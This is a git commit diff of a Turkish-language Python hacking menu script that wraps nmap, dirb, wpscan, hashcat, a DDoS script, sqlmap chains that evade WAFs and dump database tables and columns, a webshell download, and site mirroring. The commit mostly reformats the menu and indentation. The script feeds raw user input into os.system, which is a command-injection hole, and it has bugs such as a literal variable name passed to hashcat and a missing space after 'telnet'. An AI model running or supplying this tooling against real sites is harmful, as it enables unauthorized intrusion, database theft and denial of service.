41a8152ed619c6d5daa7b2b747125228c46bb696
R1Px <96251092+R1Px@users.noreply.github.com>
2021-12-31 23:13:29 +0300

    Update mycode.py

--- mycode.py
+++ mycode.py
@@ -36,97 +36,99 @@ R::::::R     R:::::R 1::::::::::1 P::::::::P             x:::::x  x:::::x
 R::::::R     R:::::R 1::::::::::1 P::::::::P            x:::::x    x:::::x 
 RRRRRRRR     RRRRRRR 111111111111 PPPPPPPPPP           xxxxxxx      xxxxxxx                         
 
-HOŞGELDIN !!!
+*** HOŞGELDIN !!! ***
 
-1:  Port Scan
-2:  Web Extension Browsing
-3:  Worpress Scan
-4:  MD5 (hash)
-5:  SHA2-256 (hash)
-6:  FREE PROXY 
-7:  DDOS Attack
-8:  SQL Scan
-9:  FTP
-10: Telnet
-11: Download WebShell
-12: Web Site Copy
+1:  *** Port Scan                ***
+2:  *** Web Extension Browsing   ***
+3:  *** Worpress Scan            ***
+4:  *** MD5 (hash)               ***
+5:  *** SHA2-256 (hash)          ***
+6:  *** FREE PROXY               ***
+7:  *** DDOS Attack              ***
+8:  *** SQL Scan                 ***
+9:  *** FTP                      ***
+10: *** Telnet                   ***
+11: *** Download WebShell        ***
+12: *** Web Site Copy            ***
+13: *** Commix Scan              ***
+14: *** Nikto Scan               ***
 """)
 
 islem = input(BOLD+MAVİ+"R1Px~#  ")
 
 if(islem == "1"):
-	ip = input("Enter Destination IP : ")
-	os.system("nmap " + " -sC " + " -sV " + ip + " -Pn ")
+        ip = input("Enter Destination IP : ")
+        os.system("nmap " + " -sC " + " -sV " + ip + " -Pn ")
 
 elif(islem == "2"):
-	print("http://domain.com/ https://domain.com/")
-	web = input("Web sitesini giriniz: ")
-	os.system("dirb " + web)
+        print("http://domain.com/ https://domain.com/")
+        web = input("Web sitesini giriniz: ")
+        os.system("dirb " + web)
 
 elif(islem == "3"):
-	wp = input("Enter website : ")
-	os.system("wpscan " + " --url " + wp)
+        wp = input("Enter website : ")
+        os.system("wpscan " + " --url " + wp)
 
 elif(islem == "4"):
-	hash = input("Enter HASH: ")
-	os.system("hashcat " + "-m 0 " + " -a 0 " + hash + " " "/usr/share/wordlists/rockyou.txt")
-	
+        hash = input("Enter HASH: ")
+        os.system("hashcat " + "-m 0 " + " -a 0 " + hash + " " "/usr/share/wordlists/rockyou.txt")
+
 elif(islem == "5"):
-	has = input("Enter HASH : ")
-	os.system("hashcat -m 1400 " " -a 0 " + " has " "/usr/share/wordlists/rockyou.txt")
+        has = input("Enter HASH : ")
+        os.system("hashcat -m 1400 " " -a 0 " + " has " "/usr/share/wordlists/rockyou.txt")
 
 elif(islem == "6"):
-	print("LOADIND !")
-	os.system("python3 proxy.py")
-	print("File --> /root/Desktop/proxy.txt")
+        print("*** LOADIND ! ***")
+        os.system("python3 proxy.py")
+        print("File --> /root/Desktop/proxy.txt")
 
 elif(islem == "7"):
-	os.system("python ddos.py")
+        os.system("python ddos.py")
 
 elif(islem == "8"):
-	print("")
-	site = input("Sitenizi Giriniz: ")
-	print("")
+        print("")
+        site = input("Sitenizi Giriniz: ")
+        print("")
 
-	os.system("sqlmap -u " + site + " --dbs --random-agent --skip-waf --tamper=between,randomcase,space2comment --level=3 --risk=3 --no-cast --threads=10 --batch -v 5xx")
+        os.system("sqlmap -u " + site + " --dbs --random-agent --skip-waf --tamper=between,randomcase,space2comment --level=3 --risk=3 --no-cast --threads=10 --batch -v 5xx")
 
-	print("")
-	database = input("Database Giriniz: ")
-	print("")
+        print("")
+        database = input("Database Giriniz: ")
+        print("")
 
-	os.system("sqlmap -u " + site + "-D " + database  + " --tables --random-agent --skip-waf --tamper=between,randomcase,space2comment --level=3 --risk=3 --no-cast --threads=10 --batch -v 5xx")
+        os.system("sqlmap -u " + site + "-D " + database  + " --tables --random-agent --skip-waf --tamper=between,randomcase,space2comment --level=3 --risk=3 --no-cast --threads=10 --batch -v 5xx")
 
-	print("")
-	tables = input("Tablo Giriniz: ")
-	print("")
+        print("")
+        tables = input("Tablo Giriniz: ")
+        print("")
 
-	os.system("sqlmap -u " + site + "-D " + database + " -T " + tables + " --columns --random-agent --skip-waf --tamper=between,randomcase,space2comment --level=3 --risk=3 --no-cast --threads=10 --batch -v 5xx")
+        os.system("sqlmap -u " + site + "-D " + database + " -T " + tables + " --columns --random-agent --skip-waf --tamper=between,randomcase,space2comment --level=3 --risk=3 --no-cast --threads=10 --batch -v 5xx")
 
-	print("")
-	kolon = input("Kolon Giriniz: ")
-	print("")
+        print("")
+        kolon = input("Kolon Giriniz: ")
+        print("")
 
-	os.system("sqlmap -u " + site + "-D " + database + " -T " + tables + " -C " + kolon + " --dump --random-agent --skip-waf --tamper=between,randomcase,space2comment --level=3 --risk=3 --no-cast --threads=10 --batch -v 5xx")
+        os.system("sqlmap -u " + site + "-D " + database + " -T " + tables + " -C " + kolon + " --dump --random-agent --skip-waf --tamper=between,randomcase,space2comment --level=3 --risk=3 --no-cast --threads=10 --batch -v 5xx")
 
 elif(islem == "9"):
-	print("IP or ftpsite.com")
-	print("Test To username and password = anonymous")
-	ftp = input("Site: ")
-	os.system("ftp " + ftp)
+        print("*** IP or ftpsite.com ***")
+        print("*** Test To username and password = anonymous ***")
+        ftp = input("Site: ")
+        os.system("ftp " + ftp)
 
 elif(islem == "10"):
-	print("IP exp: 127.0.0.1")
-	tel = input("Site: ")
-	os.system("telnet" + tel)
+        print("*** IP exp: 127.0.0.1 ***")
+        tel = input("Site: ")
+        os.system("telnet" + tel)
 
 elif(islem == "11"):
-	print("WebShell Installing")
-	os.system("git clone https://github.com/tennc/webshell")
+        print("*** WebShell Installing ***")
+        os.system("git clone https://github.com/tennc/webshell")
 
 elif(islem == "12"):
-	print("https://site.com/ or http://")
-	wget = input("Site: ")
-	os.system("wget " + "-r -p -U Mozilla --wait=10 --limit-rate=35K " + wget)
+        print("*** https://site.com/ or http:// ***")
+        wget = input("Site: ")
+        os.system("wget " + "-r -p -U Mozilla --wait=10 --limit-rate=35K " + wget)
 
 elif(islem == "13"):
         print("*** Enter To Site = http://site.com/index.php?id=  delete the id=HERE !!! ***")
@@ -140,3 +142,4 @@ elif(islem == "14"):
 
 else:
         ("ERROR !!!")
+                     
